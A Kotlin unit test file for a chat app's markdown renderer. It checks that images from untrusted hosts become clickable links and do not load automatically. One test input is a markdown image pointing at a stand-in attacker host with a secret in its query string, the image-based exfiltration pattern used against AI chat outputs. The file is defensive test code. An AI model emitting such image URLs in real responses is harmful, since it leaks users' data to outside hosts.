package com.garfiec.librechat.core.ui.markdown

import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

class TrustedImagesTest {

    private val platform = setOf("agent.hobbitton.at", "scheduler.hobbitton.at:8090")

    @Test
    fun an_image_off_the_platform_becomes_a_link_the_person_opens_on_purpose() {
        val text = "Voici ![le devis](https://attaquant.tld/p.png?d=secret) et la suite."
        assertEquals(
            "Voici [le devis (image)](https://attaquant.tld/p.png?d=secret) et la suite.",
            imagesOffTrustedHostsAsLinks(text, platform),
        )
    }

    @Test
    fun a_platform_image_and_a_data_image_draw_as_before() {
        val text = "![qr](https://Agent.hobbitton.at/files/qr.png) ![b](data:image/png;base64,AAAA)"
        assertEquals(text, imagesOffTrustedHostsAsLinks(text, platform))
        assertTrue(imageLoadsOnItsOwn("http://scheduler.hobbitton.at:8090/x.png", platform))
    }

    @Test
    fun nothing_loads_on_its_own_without_a_platform() {
        assertFalse(imageLoadsOnItsOwn("https://agent.hobbitton.at/x.png", emptySet()))
        assertEquals("[image (image)](https://x.tld/a.png)", imagesOffTrustedHostsAsLinks("![](https://x.tld/a.png)", emptySet()))
    }
}
